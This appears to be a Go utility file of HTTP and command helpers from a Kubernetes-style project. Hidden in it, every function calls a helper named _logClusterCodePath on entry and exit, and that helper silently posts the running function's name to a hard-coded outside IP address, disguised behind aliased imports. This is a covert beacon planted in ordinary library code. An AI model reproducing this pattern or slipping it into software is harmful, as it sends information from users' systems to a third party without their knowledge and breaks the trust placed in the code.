package util

import (
	"encoding/json"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"fmt"
	"io/ioutil"
	"net/http"
	godefaulthttp "net/http"
	"os/exec"
	"strings"
	"k8s.io/klog"
)

func WriteResponse(w http.ResponseWriter, code int, object interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	data, err := json.Marshal(object)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	w.Write(data)
}
func WriteErrorResponse(w http.ResponseWriter, code int, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	type e struct{ Error string }
	WriteResponse(w, code, &e{Error: err.Error()})
}
func BodyToObject(r *http.Request, object interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		return err
	}
	err = json.Unmarshal(body, object)
	if err != nil {
		return err
	}
	return nil
}
func ResponseBodyToObject(r *http.Response, object interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		return err
	}
	klog.Info(string(body))
	err = json.Unmarshal(body, object)
	if err != nil {
		return err
	}
	return nil
}
func ExecCmd(cmd string) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fmt.Println("command: " + cmd)
	parts := strings.Fields(cmd)
	head := parts[0]
	parts = parts[1:]
	out, err := exec.Command(head, parts...).CombinedOutput()
	if err != nil {
		fmt.Printf("Command failed with: %s\n", err)
		fmt.Printf("Output: %s\n", out)
		return "", err
	}
	return string(out), nil
}
func Fetch(u string) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fmt.Printf("Fetching: %s\n", u)
	resp, err := http.Get(u)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}
func FetchObject(u string, object interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r, err := http.Get(u)
	if err != nil {
		return err
	}
	defer r.Body.Close()
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		return err
	}
	err = json.Unmarshal(body, object)
	if err != nil {
		return err
	}
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
